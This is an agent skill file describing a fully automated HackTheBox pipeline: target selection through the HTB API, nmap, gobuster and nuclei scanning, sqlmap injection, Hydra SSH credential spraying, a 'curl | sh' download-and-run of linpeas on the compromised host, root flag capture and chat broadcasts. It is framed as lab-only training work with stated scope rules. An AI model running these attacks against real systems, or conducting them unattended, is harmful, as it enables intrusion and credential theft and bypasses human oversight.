---
name: htb-pwn
description: "Full HackTheBox automation pipeline. Browses active machines via the HTB v4 API, selects the best target, spawns it over the HTB VPN, runs enumeration and exploitation, captures flags, submits them, generates a pentest report, and broadcasts results to Discord, Telegram, and WhatsApp. Use when the operator wants to automatically pwn an HTB machine end-to-end without manual intervention. Requires HTB_APP_TOKEN env var and an active HTB VPN connection."
metadata:
  {
    "openclaw":
      {
        "emoji": "⚔️",
        "requires":
          {
            "bins": ["python3", "nmap", "nuclei", "gobuster", "httpx", "sqlmap", "curl"],
            "env": ["HTB_APP_TOKEN"],
          },
        "install":
          [
            {
              "id": "htb-tools-macos",
              "kind": "shell",
              "cmd": "brew install nmap gobuster httpx sqlmap nuclei && pip3 install requests rich",
              "bins": ["nmap", "gobuster", "httpx", "sqlmap", "nuclei"],
              "label": "Install HTB tools (macOS via brew + pip)",
              "when": "platform == 'darwin'",
            },
            {
              "id": "htb-tools-linux",
              "kind": "shell",
              "cmd": "sudo apt-get install -y nmap sqlmap gobuster 2>/dev/null || true && go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && go install github.com/projectdiscovery/httpx/cmd/httpx@latest && pip3 install requests rich",
              "bins": ["nmap", "gobuster", "httpx", "sqlmap", "nuclei"],
              "label": "Install HTB tools (Linux via apt + Go + pip)",
              "when": "platform == 'linux'",
            },
          ],
      },
  }
---

# HTB Pwn — Zero-Touch HackTheBox Automation

Browse active machines, enumerate, exploit, capture flags, report, and broadcast — all automated.

> [!IMPORTANT]
> All activity is confined to the **HackTheBox VPN** (`10.10.x.x` ranges). Never test
> outside authorized HTB lab networks. Rate-limit all scans to avoid VPN disconnections.
> Requires `HTB_APP_TOKEN` env var set and VPN connected (`openvpn` or HTB Pwnbox).

## Usage from Agent

```
Run the HTB automation pipeline — pick the easiest active box and get me root
Automate the current HTB season challenge box and send the report to Discord
Hack the HTB machine named "MonitorsThree" and notify Telegram when done
Run HTB automation and post the full report to WhatsApp, Discord, and Telegram
```

## Phase 0 — HTB API Auth

Set the App Token in `.env` or `openclaw.json env block`:

```bash
HTB_APP_TOKEN=eyJ...   # from https://app.hackthebox.com/profile/settings → App Token
```

The script uses this for all HTB API calls. No password required.

**Validation:** If the token is missing or expired, the agent halts immediately and prompts the operator to set or refresh `HTB_APP_TOKEN`.

## Phase 1 — Browse & Select Active Machines

### List Active (Non-Retired) Machines

```bash
curl -s -H "Authorization: Bearer $HTB_APP_TOKEN" \
  "https://www.hackthebox.com/api/v4/machine/list/active" \
  | python3 -m json.tool | head -80
```

### Selection Criteria (priority order)

| Criterion  | Preference                                     |
| ---------- | ---------------------------------------------- |
| Difficulty | Easy > Medium > Hard (skip Insane by default)  |
| OS         | Linux preferred (more automated exploit paths) |
| Points     | Higher points = more learning coverage         |
| User own % | Lower % = less competition, fresher box        |
| Season     | Current active season machines first           |

### Auto-select command

```bash
python3 skills/htb-pwn/scripts/htb_auto.py --list
```

Output shows a ranked table of active machines with the recommended target highlighted. See `scripts/htb_auto.py` for full selection logic, scoring weights, and CLI options (`--run`, `--machine <ID>`, `--no-exploit`).

**Error recovery:** If the API returns an empty machine list, verify that `HTB_APP_TOKEN` has the correct scope and that the HTB platform is not under maintenance.

## Phase 2 — Spawn & VPN Check

```bash
# Spawn machine via API
curl -s -X POST \
  -H "Authorization: Bearer $HTB_APP_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"machine_id": <ID>}' \
  "https://www.hackthebox.com/api/v4/vm/spawn"

# Verify VPN connection and machine reachability
ping -c 3 10.10.XX.XX
```

**Error recovery:** If spawn fails (HTTP 4xx/5xx), check that the VPN tunnel is active (`ip addr show tun0`) and that no other machine is already spawned (the free tier allows only one at a time). If `ping` fails after spawn succeeds, wait 30 seconds for the VM to boot and retry.

## Phase 3 — Enumeration

All tools are rate-limited to avoid overloading the VPN gateway.

### 3a — Full Port Scan (nmap)

```bash
TARGET="10.10.XX.XX"
nmap -sV -sC -p- --min-rate 2000 -oA recon/nmap_full "$TARGET"
nmap -sV --script=vuln -p "$(grep '/tcp' recon/nmap_full.gnmap | grep open | cut -d/ -f1 | tr '\n' ',')" -oA recon/nmap_vuln "$TARGET"
```

**Validation:** If nmap returns zero open ports, verify the target IP is correct and that the VPN tunnel is routing traffic to the HTB subnet. Re-run with `--min-rate 500` if packet loss is suspected.

### 3b — Web Enumeration (httpx + gobuster)

```bash
httpx -u "http://$TARGET" -u "https://$TARGET" -title -status-code -tech-detect

gobuster dir -u "http://$TARGET" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  --delay 100ms -o recon/gobuster.txt
```

### 3c — CVE / Misconfiguration Scan (nuclei)

```bash
nuclei -u "http://$TARGET" \
  -severity critical,high,medium \
  -rate-limit 5 \
  -json -o findings/nuclei.json
```

**Checkpoint:** Before proceeding to exploitation, confirm that at least one finding exists across nmap, gobuster, or nuclei output. If all scans return empty, re-examine port scan results and try UDP scan (`nmap -sU --top-ports 50`).

## Phase 4 — Exploitation (Service-Aware)

The agent auto-selects an exploitation path based on Phase 3 findings:

| Service Found        | Auto-Action                                         |
| -------------------- | --------------------------------------------------- |
| HTTP login page      | Default creds, SQLi test, CVE search                |
| SSH (port 22)        | Hydra credential spray with rockyou.txt (top 1000)  |
| SMB (port 445)       | `smbmap`, `smbclient` anonymous + credential check  |
| FTP (port 21)        | Anonymous FTP login check + file listing            |
| SQL (3306/5432/1433) | sqlmap against any discovered web endpoints         |
| CMS detected (WP)    | `wpscan` enumeration + known vulnerable plugin CVEs |

### SQL Injection via sqlmap

```bash
sqlmap -u "http://$TARGET/login" \
  --data="username=admin&password=test" \
  --batch --level=3 --risk=2 \
  --delay=1 --dbs \
  --json-output=findings/sqli.json
```

### Privilege Escalation (post-shell)

After gaining initial shell:

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>&1 | tee /tmp/linpeas.txt
```

**Error recovery:** If no exploitation path succeeds, review nuclei and nmap output for lower-severity findings. Fall back to manual enumeration hints and log all attempted vectors for the report.

## Phase 5 — Proof Collection & Flag Submission

```bash
# Capture user flag
cat /home/*/user.txt
# Capture root flag
cat /root/root.txt

# Submit flags via HTB API
curl -s -X POST \
  -H "Authorization: Bearer $HTB_APP_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"id\": <MACHINE_ID>, \"flag\": \"<FLAG_VALUE>\", \"difficulty\": 30}" \
  "https://www.hackthebox.com/api/v4/machine/own"
```

**Feedback loop:** After each flag submission, check the API response body. A `"success": true` confirms the flag was accepted. If the response indicates an invalid or already-submitted flag, log the error and re-check the proof file path. Save all evidence to `reports/<machine_name>_<date>/`.

## Phase 6 — Report Generation

The agent generates a pentest-format report saved to `reports/<machine_name>_<date>/report.md`. The report includes machine metadata, attack path summary, findings with severity ratings, captured flags, and remediation recommendations. See `scripts/htb_auto.py --run` for the automated generation logic.

## Phase 7 — Broadcast

After the report is generated, the agent sends a summary alert and the full report to all configured channels.

### Alert format (sent per flag captured)

```
⚔️ HTB BOX PWNED — <MachineName> (<Difficulty>)
Flags: User ✅ Root ✅ | Attack: <summary> | Duration: <time>
Full report: reports/<machine>_<date>/report.md
```

### Channel configuration

| Channel   | Env var / config key       | Delivery method              |
| --------- | -------------------------- | ---------------------------- |
| Discord   | `HTB_DISCORD_CHANNEL`      | Rich embed via bot webhook   |
| Telegram  | `HTB_TELEGRAM_CHAT`        | Markdown message             |
| WhatsApp  | `HTB_WHATSAPP_TO`          | Text message via `wacli`     |

## Config Reference

```json5
// In openclaw.json env block or .env
{
  env: {
    HTB_APP_TOKEN: "eyJ...",           // Required — HTB App Token
    HTB_DISCORD_CHANNEL: "123456",     // Discord channel ID to post reports
    HTB_TELEGRAM_CHAT: "@secteam",     // Telegram username or chat_id
    HTB_WHATSAPP_TO: "+1XXXXXXXXXX",   // WhatsApp number for wacli
  },
}
```

## Safety Rules

1. **VPN only** — Only scan `10.10.x.x` and `10.129.x.x` HTB ranges
2. **No DoS payloads** — Never use `--flood` or destructive scan options
3. **Flag within scope** — Only submit flags legitimately captured
4. **No sharing flags** — Do not broadcast raw flag values publicly
5. **Rate limit** — All scans respect ≤ 5 RPS to protect the VPN gateway
